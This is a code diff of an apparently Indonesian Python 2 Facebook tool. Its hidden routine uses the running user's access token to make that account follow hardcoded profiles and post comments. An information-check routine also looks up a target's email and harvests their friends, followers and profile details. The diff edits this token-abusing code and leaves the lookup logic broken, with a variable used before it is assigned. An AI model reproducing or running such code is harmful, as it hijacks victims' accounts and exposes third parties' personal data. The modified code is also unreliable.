@@ -256,7 +256,6 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100006948104862/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
@@ -388,20 +387,23 @@ def postingan(kontol):
 
 # cek ingfo
 def cek_ingfo(kontol):
+    user = raw_input("\n [+] masukan id atau username : ")
+    url = ("https://lookup-id.com/")
+    if "facebook" in user:
+    	payload = {"fburl": user, "check": "Lookup"}
+    else:
+    	payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
+    halaman = requests.post(url, data = payload).text.encode("utf-8")
+    sop_ = parser(halaman, "html.parser")
+    email_ = sop_.find("span", id = "code")
+    if email_ == None:
+    	aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol))
+    	x = json.loads(aww.text)
+    idt = email_.text
     try:
-        user = raw_input("\n [+] masukan id atau username : ")
-        url  = ("https://lookup-id.com/")
-        if "facebook" in user:
-            payload = {"fburl": user, "check": "Lookup"}
-        else:
-            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
-        halaman = requests.post(url, data = payload).text.encode("utf-8")
-        sop_ = parser(halaman, "html.parser")
-        email_ = sop_.find("span", id = "code")
-        ppk = email_.text
-        aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ppk, kontol))
-        x = json.loads(aww.text)
-    	nmaa = x['name']
+    	aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol))
+    	x = json.loads(aww.text)
+        nmaa = x['name']
     except (KeyError, IOError):
     	nmaa = '%s-%s'%(M,N)
     except: pass
@@ -460,14 +462,14 @@ def cek_ingfo(kontol):
     except: pass
     print ' [*] jenis kelamin  : %s '%(jenis)
     try:
-    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(ppk, kontol))
+    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
         z = json.loads(r.text)
         for i in z['data']:
             id.append(i['id'])
     except: pass
     print ' [*] jumblah teman  : %s'%str(len(id));time.sleep(0.03)
     try:
-    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(ppk, kontol))
+    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
         z = json.loads(r.text)
         pengikut = z['summary']['total_count']
     except (KeyError, IOError):
@@ -516,6 +518,7 @@ def cek_ingfo(kontol):
     except: pass
     print ' [*] zona waktu     : %s'%(tzim);time.sleep(0.03)
     try:
+    	jam  = x['updated_time'][11:19]
     	uptd = x['updated_time'][:10]
         year, month, day = uptd.split("-")
         month = bulan[month]
@@ -524,7 +527,7 @@ def cek_ingfo(kontol):
         month = '%s-%s'%(M,N)
         day = '%s-%s'%(M,N)
     except:pass
-    print ' [*] terakhir di updated pada tanggal %s bulan %s tahun %s '%(day, month, year);time.sleep(0.03)
+    print ' [*] terakhir di updated pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
     jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));exit()
 
